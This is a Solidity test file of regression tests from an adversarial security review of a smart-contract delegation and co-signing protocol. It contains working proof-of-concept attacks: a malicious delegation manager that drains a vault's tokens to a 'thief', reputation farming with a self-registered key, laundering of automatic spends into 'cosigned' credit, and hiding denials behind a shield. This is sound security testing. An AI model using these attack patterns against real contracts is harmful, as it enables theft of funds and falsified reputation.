// SPDX-License-Identifier: MIT
// Regression pins from the independent v1.2 verification (adversarial review round 2).
// test_v12_*_documented / farming / laundering / shield: DOCUMENTED LIMITATIONS (SPEC.md), asserted so a change is noticed.
// test_v12_*_closed / workflowOwner / sameNonce: attacks that v1.2 closes.
pragma solidity 0.8.23;

import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { HybridDeleGator } from "@delegation-framework/HybridDeleGator.sol";
import { IDelegationManager } from "@delegation-framework/interfaces/IDelegationManager.sol";
import { ExecutionLib } from "@erc7579/lib/ExecutionLib.sol";
import { ModeLib } from "@erc7579/lib/ModeLib.sol";
import { Delegation, Caveat, ModeCode } from "@delegation-framework/utils/Types.sol";

import { IntegrationBase } from "../utils/integration/IntegrationBase.sol";
import { RiparSentinel } from "../../src/RiparSentinel.sol";
import { IPulseCosignEnforcer } from "../../src/interfaces/IPulseCosignEnforcer.sol";
import { IRiparSentinel } from "../../src/interfaces/IRiparSentinel.sol";
import { IRiparDeviceRegistry } from "../../src/interfaces/IRiparDeviceRegistry.sol";
import { IRiparReputationRelay } from "../../src/interfaces/IRiparReputationRelay.sol";
import { IERC8004Identity } from "../../src/interfaces/external/IERC8004.sol";
import { Deploy } from "../../script/Deploy.s.sol";
import { DeployConfig } from "../../script/DeployConfig.sol";

contract V12EvilDelegationManager {
    function drain(HybridDeleGator v, address token, address to, uint256 amount) external {
        v.executeFromExecutor(
            ModeLib.encodeSimpleSingle(),
            ExecutionLib.encodeSingle(token, 0, abi.encodeWithSelector(bytes4(0xa9059cbb), to, amount))
        );
    }
}

/// @notice Judge v1.2 verification: mechanical adaptations of the v1.1 PoCs whose failure against v1.2 was not the
///         attack itself, plus strengthened variants (attacker self-registers its key) and new probes.
contract V12LimitationsRegressionTest is IntegrationBase {
    uint256 internal constant SOFT_P1 = 0xBADC0FFEE; // attacker's software P-256 key
    address internal atk;
    uint256 internal atkK1;

    // ------------------------------------------------------------------ helpers

    function _registerSoftKey(address owner_, uint256 ownerPk) internal returns (bytes32 sx, bytes32 sy) {
        (sx, sy) = p256Key(SOFT_P1);
        bytes32 b = registry.bindDigest(owner_, sx, sy);
        (bytes32 r, bytes32 s) = p256Sign(SOFT_P1, b);
        registry.registerDevice(owner_, sx, sy, r, s, _k1Sign(ownerPk, b)); // permissionless
    }

    function _hybridOwnedBy(address owner_) internal returns (HybridDeleGator) {
        bytes memory init =
            abi.encodeCall(HybridDeleGator.initialize, (owner_, new string[](0), new uint256[](0), new uint256[](0)));
        return HybridDeleGator(payable(address(new ERC1967Proxy(address(hybridImpl), init))));
    }

    function _softTerms(bytes32 sx, bytes32 sy) internal view returns (IPulseCosignEnforcer.PulseTerms memory t) {
        t = _tokenTerms();
        t.px = sx;
        t.py = sy;
        t.sentinel = address(0);
    }

    // ================================================================== ATTACKER-2 / ENF-2 / PERIPHERY-1 / INT-1,
    // strengthened: the attacker REGISTERS its software key to its own EOA (the registry is permissionless) and uses a
    // throwaway HybridDeleGator it owns. SPEC v1.2 claims this farming is closed.
    function test_v12_farming_selfRegisteredSoftwareKey_throwawayVault_isCredited() public {
        (atk, atkK1) = makeAddrAndKey("attacker");
        (bytes32 sx, bytes32 sy) = _registerSoftKey(atk, atkK1);
        HybridDeleGator evilVault = _hybridOwnedBy(atk); // holds nothing

        vm.prank(atk);
        uint256 myAgent = identity.register("ipfs://sock-puppet", new IERC8004Identity.MetadataEntry[](0));

        Caveat[] memory caveats = new Caveat[](1);
        caveats[0] = Caveat({ enforcer: address(enforcer), terms: abi.encode(_softTerms(sx, sy)), args: "" });
        Delegation memory d = Delegation({
            delegate: atk,
            delegator: address(evilVault),
            authority: ROOT_AUTHORITY,
            caveats: caveats,
            salt: 1,
            signature: ""
        });
        bytes32 dh = delegationManager.getDelegationHash(d);
        d.signature = _k1Sign(atkK1, _digest(delegationManager.getDomainHash(), dh));

        uint256 before = reputation.feedbackCount();
        for (uint256 i = 1; i <= 5; ++i) {
            Cosign memory c = _cosignFor(d, atk, atk, 0, "", i); // 0-value "payment" to itself
            bytes32 digest = _approvalDigest(c);
            (bytes32 r, bytes32 s) = p256Sign(SOFT_P1, digest);
            _redeemAs(atk, d, abi.encode(c.nonce, c.expiry, c.presenceHash, r, s), atk, 0, "");
            vm.prank(atk);
            relay.attestApproval(myAgent, digest);
        }
        assertEq(reputation.feedbackCount() - before, 5, "5 self-minted +1 cosigned with a self-registered soft key");
    }

    // ================================================================== PERIPHERY-1b strengthened: AUTO-spend
    // laundering by an agent that is a smart account whose owner registered a software key.
    function test_v12_laundering_smartAccountAgent_autoSpendsBecomeCosignedCredit() public {
        (atk, atkK1) = makeAddrAndKey("attacker");
        (bytes32 sx, bytes32 sy) = _registerSoftKey(atk, atkK1);
        HybridDeleGator agentAcct = _hybridOwnedBy(atk); // the AI agent is a smart account owned by atk
        address aa = address(agentAcct);

        vm.prank(atk);
        uint256 myAgent = identity.register("ipfs://agent", new IERC8004Identity.MetadataEntry[](0));
        vm.prank(atk);
        identity.setAuthorized(myAgent, aa, true);

        // the USER's real mandate to the agent account; the user co-signs a payee once
        Delegation memory root = _mandateFor(aa, _tokenTerms(), 77);
        bytes32 rootHash = _hash(root);
        {
            bytes memory data = _transfer(payee, 1e6);
            (bytes memory hArgs,) = _signCosign(_cosignFor(root, aa, address(musd), 0, data, 1));
            _redeemAs(aa, root, hArgs, address(musd), 0, data);
        }

        // leaf: agentAcct -> agentAcct under the user's mandate, Pulse caveat with the agent owner's registered soft key
        Caveat[] memory caveats = new Caveat[](1);
        caveats[0] = Caveat({ enforcer: address(enforcer), terms: abi.encode(_softTerms(sx, sy)), args: "" });
        Delegation memory leaf =
            Delegation({ delegate: aa, delegator: aa, authority: rootHash, caveats: caveats, salt: 1, signature: "" });
        bytes32 leafHash = delegationManager.getDelegationHash(leaf);
        leaf.signature = _k1Sign(atkK1, _digest(delegationManager.getDomainHash(), leafHash)); // ERC-1271 by owner

        uint256 before = reputation.feedbackCount();
        for (uint256 i = 1; i <= 3; ++i) {
            bytes32 digest = _launder(leaf, root, leafHash, aa, i);
            vm.prank(aa);
            relay.attestApproval(myAgent, digest);
        }
        assertEq(reputation.feedbackCount() - before, 3, "3 AUTO spends laundered into 3 'cosigned' +1s");
        assertEq(musd.balanceOf(payee), 1e6 + 15e6);
    }

    function _launder(Delegation memory leaf, Delegation memory root, bytes32 leafHash, address aa, uint256 i)
        internal
        returns (bytes32 digest)
    {
        bytes memory data = _transfer(payee, 5e6);
        uint64 expiry = uint64(block.timestamp + 1 hours);
        digest = enforcer.approvalDigest(leafHash, aa, aa, address(musd), 0, keccak256(data), i, expiry, bytes32(0));
        Delegation[] memory chain = new Delegation[](2);
        (bytes32 r, bytes32 s) = p256Sign(SOFT_P1, digest);
        chain[0] = _withArgs(leaf, abi.encode(i, expiry, bytes32(0), r, s)); // HUMAN path, agent's own key
        chain[1] = _withArgs(root, ""); // the user's mandate: AUTO path, no human
        _redeemChain(aa, chain, singleMode, ExecutionLib.encodeSingle(address(musd), 0, data));
    }

    // ================================================================== PERIPHERY-5 (local port of the fork PoC)
    function test_v12_shield_denialRecorded_andApprovalsBarredForever() public {
        // agent owner makes the relay authorized for its agent (the shield)
        vm.prank(agentOwner);
        identity.setAuthorized(agentId, address(relay), true);

        bytes32 requestHash = keccak256("a request the user denied");
        (bytes32 r, bytes32 s) = p256Sign(DEVICE_P1_PK, relay.denyDigest(agentId, requestHash, bytes32(0)));
        uint256 before = reputation.feedbackCount();
        relay.attestDenial(agentId, requestHash, bytes32(0), px, py, r, s); // no longer reverts
        assertEq(relay.shieldedDenials(agentId), 1);
        assertEq(reputation.feedbackCount(), before, "no ERC-8004 feedback for a shielded denial");

        // lifting the shield does not help: approvals are barred for good
        vm.prank(agentOwner);
        identity.setAuthorized(agentId, address(relay), false);
        Delegation memory m = _mandate(_tokenTerms(), 5);
        bytes memory data = _transfer(payee, 1e6);
        (bytes memory args, bytes32 digest) = _signCosign(_cosign(m, address(musd), 0, data, 1));
        _redeem(m, args, address(musd), 0, data);
        vm.prank(agent);
        vm.expectRevert(IRiparReputationRelay.AgentIsShielded.selector);
        relay.attestApproval(agentId, digest);
    }

    /// @dev INFO: the shield keeps a denial out of ERC-8004. An agent that collected +1s, then raises the shield (or
    ///      front-runs a pending denial with it), shows only +1s to readers of the ERC-8004 summary; the denial lives
    ///      only in relay.shieldedDenials / AgentShielded.
    function test_v12_shield_preFarmedPlusOnes_denialInvisibleInERC8004() public {
        Delegation memory m = _mandate(_tokenTerms(), 6);
        uint256 before = reputation.feedbackCount();
        for (uint256 i = 1; i <= 3; ++i) {
            bytes memory data = _transfer(payee, 1e6);
            (bytes memory args, bytes32 digest) = _signCosign(_cosign(m, address(musd), 0, data, i));
            _redeem(m, args, address(musd), 0, data);
            vm.prank(agent);
            relay.attestApproval(agentId, digest);
        }
        // the user denies a request; the agent owner raises the shield just before the denial lands
        vm.prank(agentOwner);
        identity.setAuthorized(agentId, address(relay), true);
        bytes32 requestHash = keccak256("denied");
        (bytes32 r, bytes32 s) = p256Sign(DEVICE_P1_PK, relay.denyDigest(agentId, requestHash, bytes32(0)));
        relay.attestDenial(agentId, requestHash, bytes32(0), px, py, r, s);
        vm.prank(agentOwner);
        identity.setAuthorized(agentId, address(relay), false);

        assertEq(reputation.feedbackCount() - before, 3, "ERC-8004 shows +3 / -0");
        for (uint256 i = before; i < before + 3; ++i) {
            assertEq(reputation.feedbackAt(i).value, int128(1));
        }
        assertEq(relay.shieldedDenials(agentId), 1, "the denial only lives in the relay");
        // and the same device denial cannot be re-filed now that the shield is down
        vm.expectRevert(IRiparReputationRelay.AlreadyAttested.selector);
        relay.attestDenial(agentId, requestHash, bytes32(0), px, py, r, s);
    }

    // ================================================================== PROTOCOL-3 split / ATTACKER-3
    function _knownPayee(Delegation memory m) internal {
        bytes memory data = _transfer(payee, 1e6);
        (bytes memory args,) = _signCosign(_cosign(m, address(musd), 0, data, 1));
        _redeem(m, args, address(musd), 0, data);
    }

    /// @dev part 1 (reopen signed while open, withheld, relayed after a LATER close): still works = documented
    function test_v12_PROTOCOL3_part1_withheldReopen_undoesLaterClose_documented() public {
        Delegation memory m = _mandate(_tokenTerms(), 31);
        _knownPayee(m);
        (bytes32 r1, bytes32 s1) = _reopenSig(1); // signed while the lane is open, never relayed
        vm.roll(B0 + 5_000_000);
        _closeLane(7, uint64(block.number));
        vm.expectRevert(IPulseCosignEnforcer.LaneClosed.selector);
        _autoTransfer(m, payee, 1e6);
        sentinel.reopen(address(vault), 1, r1, s1);
        assertTrue(sentinel.laneOpen(address(vault)), "withheld reopen undid the later close");
        _autoTransfer(m, payee, PER_TX);
        // mitigation: a report as of the reopen block closes again
        _closeLane(7, uint64(block.number));
        assertFalse(sentinel.laneOpen(address(vault)));
    }

    /// @dev part 2 (front-run an in-flight close while the lane is open): closed by LaneNotClosed
    function test_v12_PROTOCOL3_part2_frontRunInFlightClose_closed() public {
        Delegation memory m = _mandate(_tokenTerms(), 32);
        _knownPayee(m);
        (bytes32 r2, bytes32 s2) = _reopenSig(2);
        vm.roll(B0 + 1000);
        uint64 observedAt = uint64(block.number);
        vm.roll(block.number + 50);
        vm.expectRevert(IRiparSentinel.LaneNotClosed.selector);
        sentinel.reopen(address(vault), 2, r2, s2);
        _closeLane(8, observedAt);
        assertFalse(sentinel.laneOpen(address(vault)), "in-flight close lands");
        vm.expectRevert(IPulseCosignEnforcer.LaneClosed.selector);
        _autoTransfer(m, payee, PER_TX);
        // the withheld nonce 2 is not burnt by the failed attempt: it can still undo THIS close (documented)
        assertEq(sentinel.lastReopenNonce(address(vault)), 0);
    }

    // ================================================================== ATTACKER-4 / PERIPHERY-4 / INTEGRATION-2
    function test_v12_workflowOwner_requiredOnMonad_andFutureAsOfBlockRejected() public {
        Deploy script = new Deploy();
        vm.expectRevert(DeployConfig.MissingWorkflowOwner.selector);
        script.configFor(143, makeAddr("fwd"), address(0), address(0), address(0), address(0));
        vm.expectRevert(DeployConfig.MissingWorkflowOwner.selector);
        script.configFor(10_143, address(0), address(0), address(0), address(0), address(0));

        // the v1.2 fixture sentinel pins a workflow owner: a stranger's workflow is refused
        vm.expectRevert(IRiparSentinel.BadWorkflowOwner.selector);
        _reportAs(makeAddr("stranger workflow owner"), address(vault), 0, uint64(block.number));

        // even a sentinel built with owner 0 (only possible on 31337) refuses asOfBlock = 2^64-1
        RiparSentinel s = new RiparSentinel(forwarder, IRiparDeviceRegistry(address(registry)), address(0));
        vm.prank(forwarder);
        vm.expectRevert(IRiparSentinel.BadReport.selector);
        s.onReport(
            abi.encodePacked(keccak256("x"), bytes10("griefer"), makeAddr("any"), hex"0001"),
            abi.encode(address(vault), false, uint8(255), type(uint64).max)
        );
    }

    // ================================================================== ATTACKER-6 (mechanical: reopen needs a
    // closed lane now; the attack itself never involved the sentinel)
    function test_v12_ATTACKER6_fakeDelegationManagerVault_stillDrains_documented() public {
        V12EvilDelegationManager evilDm = new V12EvilDelegationManager();
        HybridDeleGator evilImpl = new HybridDeleGator(IDelegationManager(address(evilDm)), entryPoint);
        HybridDeleGator fakeVault = HybridDeleGator(
            payable(address(
                    new ERC1967Proxy(
                        address(evilImpl),
                        abi.encodeCall(
                            HybridDeleGator.initialize, (k1, new string[](0), new uint256[](0), new uint256[](0))
                        )
                    )
                ))
        );
        assertEq(fakeVault.owner(), k1);
        musd.faucet(address(fakeVault), 1_000e6);
        address thief = makeAddr("thief");
        evilDm.drain(fakeVault, address(musd), thief, 1_000e6);
        assertEq(musd.balanceOf(thief), 1_000e6);
    }

    // ================================================================== PROTOCOL-1 strengthened
    function test_v12_PROTOCOL1_sameNonceDifferentRequest_andBadSigDoesNotBurn() public {
        Delegation memory m = _mandate(_tokenTerms(), 41);
        // a bad signature with nonce 7 does not burn it
        Cosign memory c0 = _cosign(m, address(musd), 0, _transfer(payee, 400e6), 7);
        bytes32 d0 = _approvalDigest(c0);
        (bytes32 r0, bytes32 s0) = p256Sign(SOFT_P1, d0);
        vm.expectRevert(IPulseCosignEnforcer.BadCosign.selector);
        _redeem(m, abi.encode(c0.nonce, c0.expiry, c0.presenceHash, r0, s0), address(musd), 0, c0.callData);
        assertFalse(enforcer.nonceUsed(address(delegationManager), _hash(m), 7));

        (bytes memory a1,) = _signCosign(c0);
        _redeem(m, a1, address(musd), 0, c0.callData);
        // any other request with nonce 7 under this mandate (other amount, payee, expiry, presence)
        Cosign memory c1 = _cosign(m, address(musd), 0, _transfer(payee2, 1), 7);
        c1.expiry = uint64(block.timestamp + 5 minutes);
        c1.presenceHash = _presence(999);
        (bytes memory a2,) = _signCosign(c1);
        vm.expectRevert(IPulseCosignEnforcer.CosignReplayed.selector);
        _redeem(m, a2, address(musd), 0, c1.callData);
        assertEq(musd.balanceOf(payee), 400e6, "paid once");
    }
}
